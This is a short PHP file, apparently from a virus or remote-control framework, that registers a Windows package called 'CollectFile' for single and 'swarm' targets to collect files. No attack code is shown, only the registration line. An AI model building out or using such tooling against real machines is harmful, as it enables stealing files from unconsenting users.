<?php

use Kelvinho\Virus\Attack\Classes;
use Kelvinho\Virus\Attack\PackageRegistrar;

PackageRegistrar::register("win.oneTime.CollectFile", "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\CollectFile\\CollectFile", "easy.CollectFile", __DIR__, [Classes::WINDOWS_ALONE, Classes::WINDOWS_SWARM], "Collects a bunch of files");